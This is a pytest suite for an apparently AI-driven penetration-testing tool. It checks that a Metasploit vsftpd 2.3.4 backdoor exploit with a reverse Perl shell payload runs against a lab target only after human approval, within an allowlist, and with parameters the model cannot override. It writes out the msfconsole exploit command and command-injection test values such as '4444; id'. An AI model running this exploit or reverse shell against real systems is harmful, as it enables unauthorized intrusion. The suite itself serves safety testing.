import pytest

from pentaia.approval import (
    Phase3ActionProposal,
    approve_phase3_action,
    create_pending_approval,
)
from pentaia import metasploit_wrapper


@pytest.fixture(autouse=True)
def fixed_listener_port(monkeypatch: pytest.MonkeyPatch) -> None:
    """Keep the runtime-owned listener port deterministic across the suite."""
    monkeypatch.setenv("PENTAIA_LPORT", "4444")


def _proposal(
    *,
    target: str = "172.16.0.64",
    action_id: str = "validate_vsftpd_234_backdoor",
    parameters: dict | None = None,
) -> Phase3ActionProposal:
    return Phase3ActionProposal(
        action_id=action_id,
        target=target,
        rationale="Validate a confirmed Phase 2 finding in the authorized lab.",
        expected_effect="Run the predefined controlled validation action.",
        parameters=(
            parameters
            if parameters is not None
            else {"rport": 21, "lhost": "172.16.0.13", "lport": 4444}
        ),
    )


def _approved(proposal: Phase3ActionProposal):
    pending = create_pending_approval(proposal)
    return approve_phase3_action(
        pending,
        proposal_signature=proposal.signature(),
    )


def test_prepare_parameters_resolves_runtime_callback_before_approval(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")

    parameters = metasploit_wrapper.prepare_metasploit_parameters(
        "validate_vsftpd_234_backdoor",
        {"rport": 21},
    )

    assert parameters == {"rport": 21, "lhost": "172.16.0.13", "lport": 4444}


def test_prepare_parameters_fails_closed_when_callback_missing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.delenv("PENTAIA_LHOST", raising=False)

    with pytest.raises(ValueError, match="PENTAIA_LHOST is required"):
        metasploit_wrapper.prepare_metasploit_parameters(
            "validate_vsftpd_234_backdoor",
            {"rport": 21},
        )


def test_prepare_parameters_rejects_invalid_callback(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_LHOST", "not-an-ip")

    with pytest.raises(ValueError, match="valid IPv4"):
        metasploit_wrapper.prepare_metasploit_parameters(
            "validate_vsftpd_234_backdoor",
            {"rport": 21},
        )


def test_approved_authorized_action_invokes_exact_predefined_module(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
    monkeypatch.delenv("PENTAIA_PHASE3_DENYLIST", raising=False)
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")

    captured: dict[str, object] = {}

    def fake_run_command(command: str, timeout: int):
        captured["command"] = command
        captured["timeout"] = timeout
        return "session opened", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal()
    result = metasploit_wrapper.run_metasploit_action(
        proposal,
        _approved(proposal),
    )

    assert result.action_id == "validate_vsftpd_234_backdoor"
    assert result.target == "172.16.0.64"
    assert result.module == "exploit/unix/ftp/vsftpd_234_backdoor"
    assert result.parameters == {"rport": 21, "lhost": "172.16.0.13", "lport": 4444}
    assert result.stdout == "session opened"
    assert result.stderr == ""
    assert result.exit_code == 0
    assert captured["timeout"] == 150

    command = str(captured["command"])
    assert command.startswith("timeout --signal=INT --kill-after=10 120 msfconsole -q -x ")
    assert "exploit/unix/ftp/vsftpd_234_backdoor" in command
    assert "set RHOSTS 172.16.0.64" in command
    assert "set RPORT 21" in command
    assert "set LHOST 172.16.0.13" in command
    assert "run" in command


def test_payload_is_code_owned_and_version_independent(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The emitted payload must be pinned, never inherited from MSF defaults."""
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")

    captured: dict[str, object] = {}

    def fake_run_command(command: str, timeout: int):
        captured["command"] = command
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal()
    metasploit_wrapper.run_metasploit_action(proposal, _approved(proposal))

    command = str(captured["command"])
    assert "set PAYLOAD cmd/unix/reverse_perl" in command

    # The operation is code-owned: the model cannot supply target or payload.
    operation = metasploit_wrapper.PREDEFINED_METASPLOIT_OPERATIONS[
        "validate_vsftpd_234_backdoor"
    ]
    assert operation.payload == "cmd/unix/reverse_perl"
    # The lab build exposes a single target; emitting an index fails at run time.
    assert operation.target is None
    assert "set TARGET" not in command
    # A reverse payload must be told the exact PentAiA-owned callback port.
    assert "set LHOST 172.16.0.13" in command
    assert "set LPORT 4444" in command


def test_auto_check_is_disabled_for_the_stale_bind_listener(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A leftover 6200/TCP bind listener must not abort the exploit.

    Once the backdoor has been triggered, its bind listener stays bound and the
    automatic check then fails with "Cannot reliably check exploitability",
    which is a stale-state artifact rather than evidence about the target.
    """
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")

    captured: dict[str, object] = {}

    def fake_run_command(command: str, timeout: int):
        captured["command"] = command
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal()
    metasploit_wrapper.run_metasploit_action(proposal, _approved(proposal))

    command = str(captured["command"])
    assert "set AutoCheck false" in command
    assert command.index("set AutoCheck false") < command.index("run")


def test_command_is_bounded_so_a_blocking_payload_cannot_hang(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """paramiko's recv_exit_status() has no timeout, so the command must self-bound.

    `cmd/unix/interact` hands off to a handler that waits on stdin, which an
    automated SSH run never supplies. Without the remote `timeout` wrapper the
    call blocks forever and PentAiA hangs instead of returning a result.
    """
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")

    captured: dict[str, object] = {}

    def fake_run_command(command: str, timeout: int):
        captured["command"] = command
        captured["timeout"] = timeout
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal()
    metasploit_wrapper.run_metasploit_action(proposal, _approved(proposal))

    command = str(captured["command"])
    operation = metasploit_wrapper.PREDEFINED_METASPLOIT_OPERATIONS[
        "validate_vsftpd_234_backdoor"
    ]

    assert command.startswith("timeout ")
    assert "--kill-after=" in command
    assert f" {operation.timeout} msfconsole" in command
    # The SSH-side timeout must outlast the remote bound, so the exit status we
    # read is the command's own rather than a socket timeout.
    assert captured["timeout"] > operation.timeout


@pytest.mark.parametrize("parameter", ["payload", "target", "PAYLOAD", "module"])
def test_model_cannot_supply_code_owned_parameters(
    monkeypatch: pytest.MonkeyPatch,
    parameter: str,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")

    called = False

    def fake_run_command(command: str, timeout: int):
        nonlocal called
        called = True
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal(
        parameters={"rport": 21, "lhost": "172.16.0.13", parameter: "cmd/unix/reverse"}
    )

    with pytest.raises(ValueError, match="Unsupported parameters"):
        metasploit_wrapper.run_metasploit_action(proposal, _approved(proposal))

    assert called is False


def test_runtime_callback_change_after_approval_blocks_before_execution(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")

    called = False

    def fake_run_command(command: str, timeout: int):
        nonlocal called
        called = True
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal()
    approval = _approved(proposal)
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.14")

    with pytest.raises(ValueError, match="approval is stale"):
        metasploit_wrapper.run_metasploit_action(proposal, approval)

    assert called is False


def test_runtime_callback_missing_after_approval_blocks_before_execution(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")

    called = False

    def fake_run_command(command: str, timeout: int):
        nonlocal called
        called = True
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal()
    approval = _approved(proposal)
    monkeypatch.delenv("PENTAIA_LHOST")

    with pytest.raises(ValueError, match="PENTAIA_LHOST is required"):
        metasploit_wrapper.run_metasploit_action(proposal, approval)

    assert called is False


def test_missing_approval_blocks_before_remote_execution(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")

    called = False

    def fake_run_command(command: str, timeout: int):
        nonlocal called
        called = True
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    with pytest.raises(ValueError, match="explicit human approval"):
        metasploit_wrapper.run_metasploit_action(_proposal(), None)

    assert called is False


def test_unauthorized_target_blocks_before_remote_execution(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")

    called = False

    def fake_run_command(command: str, timeout: int):
        nonlocal called
        called = True
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal(target="172.16.0.99")

    with pytest.raises(ValueError, match="not explicitly authorized"):
        metasploit_wrapper.run_metasploit_action(
            proposal,
            _approved(proposal),
        )

    assert called is False


def test_protected_target_blocks_even_when_allowlisted(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.1")

    called = False

    def fake_run_command(command: str, timeout: int):
        nonlocal called
        called = True
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal(target="172.16.0.1")

    with pytest.raises(ValueError, match="blocked for protected target"):
        metasploit_wrapper.run_metasploit_action(
            proposal,
            _approved(proposal),
        )

    assert called is False


def test_changed_proposal_invalidates_previous_approval(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")

    original = _proposal(
        parameters={"rport": 21, "lhost": "172.16.0.13", "lport": 4444}
    )
    approval = _approved(original)
    changed = _proposal(parameters={"rport": 2121, "lhost": "172.16.0.13"})

    with pytest.raises(ValueError, match="stale or belongs to a different action"):
        metasploit_wrapper.run_metasploit_action(changed, approval)


def test_unknown_action_id_is_rejected() -> None:
    proposal = _proposal(action_id="arbitrary_msfconsole")

    with pytest.raises(ValueError, match="Unsupported Phase 3 Metasploit action"):
        metasploit_wrapper.run_metasploit_action(proposal, _approved(proposal))


def test_unexpected_parameter_is_rejected_before_remote_execution(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")

    called = False

    def fake_run_command(command: str, timeout: int):
        nonlocal called
        called = True
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal(
        parameters={
            "rport": 21,
            "lhost": "172.16.0.13",
            "command": "whoami",
        }
    )

    with pytest.raises(ValueError, match="Unsupported parameters"):
        metasploit_wrapper.run_metasploit_action(
            proposal,
            _approved(proposal),
        )

    assert called is False


@pytest.mark.parametrize("rport", [0, 65536, "21", True])
def test_invalid_rport_is_rejected(
    monkeypatch: pytest.MonkeyPatch,
    rport,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
    proposal = _proposal(parameters={"rport": rport, "lhost": "172.16.0.13"})

    with pytest.raises(ValueError, match="Metasploit rport"):
        metasploit_wrapper.run_metasploit_action(
            proposal,
            _approved(proposal),
        )


# --- runtime-owned listener port -------------------------------------------
#
# The listener port is a material value: PentAiA owns it, the exact resolved
# value is covered by the signed proposal, and changing it invalidates a prior
# approval just like the callback address.


def test_prepare_parameters_includes_runtime_listener_port(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")
    monkeypatch.setenv("PENTAIA_LPORT", "5555")

    parameters = metasploit_wrapper.prepare_metasploit_parameters(
        "validate_vsftpd_234_backdoor",
        {"rport": 21},
    )

    assert parameters == {"rport": 21, "lhost": "172.16.0.13", "lport": 5555}


def test_model_supplied_listener_port_cannot_override_runtime_value(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")
    monkeypatch.setenv("PENTAIA_LPORT", "5555")

    parameters = metasploit_wrapper.prepare_metasploit_parameters(
        "validate_vsftpd_234_backdoor",
        {"rport": 21, "lport": 9999},
    )

    # The runtime value always wins: the model cannot choose where PentAiA listens.
    assert parameters["lport"] == 5555


def test_listener_port_is_covered_by_the_proposal_signature(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")

    monkeypatch.setenv("PENTAIA_LPORT", "4444")
    first = metasploit_wrapper.prepare_metasploit_parameters(
        "validate_vsftpd_234_backdoor", {"rport": 21}
    )

    monkeypatch.setenv("PENTAIA_LPORT", "5555")
    second = metasploit_wrapper.prepare_metasploit_parameters(
        "validate_vsftpd_234_backdoor", {"rport": 21}
    )

    first_proposal = _proposal(parameters=first)
    second_proposal = _proposal(parameters=second)

    assert first_proposal.signature() != second_proposal.signature()


def test_runtime_listener_change_after_approval_blocks_before_execution(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
    monkeypatch.setenv("PENTAIA_LHOST", "172.16.0.13")

    called = False

    def fake_run_command(command: str, timeout: int):
        nonlocal called
        called = True
        return "", "", 0

    monkeypatch.setattr(metasploit_wrapper, "run_command", fake_run_command)

    proposal = _proposal()
    approval = _approved(proposal)

    monkeypatch.setenv("PENTAIA_LPORT", "5555")

    with pytest.raises(ValueError, match="listener configuration changed"):
        metasploit_wrapper.run_metasploit_action(proposal, approval)

    assert called is False


@pytest.mark.parametrize("lport", [0, 65536, "4444; id", True])
def test_invalid_listener_port_is_rejected(
    monkeypatch: pytest.MonkeyPatch,
    lport,
) -> None:
    monkeypatch.setenv("PENTAIA_PHASE3_ALLOWLIST", "172.16.0.64")
    proposal = _proposal(
        parameters={"rport": 21, "lhost": "172.16.0.13", "lport": lport}
    )

    with pytest.raises(ValueError, match="PENTAIA_LPORT"):
        metasploit_wrapper.run_metasploit_action(
            proposal,
            _approved(proposal),
        )
